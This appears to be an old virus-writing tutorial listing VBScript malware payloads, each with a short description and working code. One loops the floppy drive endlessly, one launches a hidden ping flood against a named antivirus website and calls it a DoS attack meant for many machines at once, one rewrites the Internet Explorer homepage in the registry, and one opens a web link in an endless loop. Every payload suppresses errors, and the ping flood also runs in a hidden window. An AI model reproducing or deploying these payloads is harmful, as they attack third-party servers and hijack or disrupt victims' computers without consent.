--------Loop floppy disk read--------

Description: This payloads has to be one of the most annoying
non-damaging payloads that I can think of. It simply makes the
floppy disk drive read at an infinate loop.

Here is the code:
-------------------------------------

On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set DriveA = fso.GetDrive("A:")
Do
If DriveA.IsReady Then DiskReady = True
Loop

-------------------------------------



--------DoS (Denial of Service) attack--------

Description: This code basically Pingfloods a specific webpage,
Link, FTP or whatever. However, just one computer doing a Pingflood
will not cause much damage, but if at least 30 computers were doing it,
it would.

Here is the code:
-------------------------------------

On Error Resume Next
Set wsc = CreateObject("WScript.Shell")
wsc.Run "Ping.exe -t -l 916 www.av.com", 0, False

-------------------------------------



--------Change IE (Internet Explorer) homepage--------

Description: This just changes the homepage of IE using the registry.

Here is the code:
-------------------------------------

On Error Resume Next
Set wsc = CreateObject("WScript.Shell")
wsc.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.wescam.u"

-------------------------------------
--------File/Link execution loop--------

Decription: This code basically executes a File or web link on
a loop.

Here is the code:
-------------------------------------

On Error Resume Next
Set wsc = CreateObject("WScript.Shell")
Do
wsc.Run "http://www.rrlf.de/", 3, False
Loop

-------------------------------------


